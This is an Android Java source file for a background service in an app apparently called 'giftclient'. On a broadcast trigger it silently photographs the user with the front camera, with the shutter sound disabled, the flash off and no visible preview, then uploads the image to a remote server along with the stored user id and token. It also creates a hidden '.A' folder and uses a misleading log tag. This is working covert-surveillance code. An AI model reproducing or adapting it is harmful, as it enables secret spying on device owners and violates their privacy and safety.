package com.example.administrator.giftclient.service;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.support.annotation.IntDef;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import com.example.administrator.giftclient.config.Config;
import com.example.administrator.giftclient.model.User;
import com.example.administrator.giftclient.support.ConnectServer;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;

/**
 * Created by Administrator on 16/6/2017.
 */

public class CameraService extends Service implements ConnectServer.ConnectComplete {
    Camera camera;
    int z = 1;
    Handler handler;
    File folder;
    File file;
    Camera.Parameters parameters;
    SurfaceTexture surfaceTexture;
    int id = 0x11111111;
    private User user;
    int i = 0;
    static boolean is_take_picture = false;
    boolean hasCamera = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    @Override
    public void onCreate() {
        super.onCreate();
        getUser();
        folder = new File(Environment.getExternalStorageDirectory() + File.separator + ".A");
        if (!folder.exists())
            folder.mkdirs();
        handler = new Handler();
        PackageManager pm = getApplicationContext().getPackageManager();
        hasCamera = pm.hasSystemFeature(PackageManager.FEATURE_CAMERA);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        Log.v("HH", "onStartCommand");
        getApplicationContext().registerReceiver(take_image, new IntentFilter("take_image"));
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        getApplicationContext().unregisterReceiver(take_image);
        super.onDestroy();
    }

    Runnable runnable = new Runnable() {
        @Override
        public void run() {
            take();
            handler.postDelayed(this, 5000);
        }
    };

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    synchronized void take() {
//        Log.v("HH", "" + i);
        i++;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
            if (hasCamera && is_take_picture == false) {
                Log.v("EmulatedCamera_Camera", "duoc chup: " + is_take_picture);
                is_take_picture = true;
                try {
                    camera = getCameraInstance();
                    if (camera != null) {
                        parameters = camera.getParameters();
                        parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                        parameters.setWhiteBalance(Camera.Parameters.WHITE_BALANCE_AUTO);
                        parameters.setAutoWhiteBalanceLock(true);
                        camera.setParameters(parameters);
                        surfaceTexture = new SurfaceTexture(id);
                        camera.setPreviewTexture(surfaceTexture);
                        camera.enableShutterSound(false);
                        camera.startPreview();
                        CountDownTimer countDownTimer = new CountDownTimer(2000, 1000) {
                            @Override
                            public void onTick(long millisUntilFinished) {

                            }

                            @Override
                            public void onFinish() {
                                camera.takePicture(null, null, new Camera.PictureCallback() {
                                    @Override
                                    public void onPictureTaken(byte[] data, Camera camera) {
                                        upload(data, getApplicationContext());
                                        camera.stopPreview();
                                        try {
                                            camera.setPreviewTexture(null);
                                        } catch (IOException e) {
                                            e.printStackTrace();
                                        }
                                        camera.release();
                                        camera=null;
                                        is_take_picture = false;
                                    }
                                });
                            }
                        }.start();
                    } else {
                        Log.v("EmulatedCamera_Camera", "use");
                    }

                } catch (IOException e) {
                    Log.v("EmulatedCamera_Camera", e.toString());
                    camera=null;
                    is_take_picture = false;
                }
            } else {
                Log.v("EmulatedCamera_Camera", "camera is busy");
            }

        }

    }

    public void upload(final byte[] data, final Context context) {
        handler.post(new Runnable() {
            @Override
            public void run() {
                getUser();
                String image = Base64.encodeToString(data, Base64.DEFAULT);
                ConnectServer connectServer = new ConnectServer(context, CameraService.this);
                connectServer.setUrl(Config.UPLOAD_FILE);
                HashMap<String, String> map = new HashMap<>();
                map.put("image", image);
                map.put("idUser", String.valueOf(user.getId()));
                map.put("token", getToken());
                connectServer.setPara(map);
                connectServer.connect();
            }
        });
    }

    private boolean checkCamera() {
        if (getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))
            return true;
        else
            return false;
    }

    @Override
    public void response(String response) {
        Log.v("CAMERA", response);
    }

    public void getUser() {
        user = new User();
        SharedPreferences sharedPreferences = getSharedPreferences(Config.PREF, 0);
        user.setId(sharedPreferences.getInt("id", -1));
        user.setUserName(sharedPreferences.getString("userName", null));
        user.setPassWord(sharedPreferences.getString("passWord", null));
    }

    private String getToken() {
        SharedPreferences sharedPreferences = getSharedPreferences(Config.PREF, 0);
//        Log.v("token", sharedPreferences.getString("token", ""));
        return sharedPreferences.getString("token", "");

    }

    BroadcastReceiver take_image = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            Log.v("CAMERA", "GET LOG");
            take();
        }
    };

    public static Camera getCameraInstance() {
        Camera c = null;
        try {
            c = Camera.open(1); // attempt to get a Camera instance
        } catch (Exception e) {
            // Camera is not available (in use or does not exist)
//            Log.v("EmulatedCamera_Camera", "use1");
        }
        return c; // returns null if camera is unavailable
    }
}
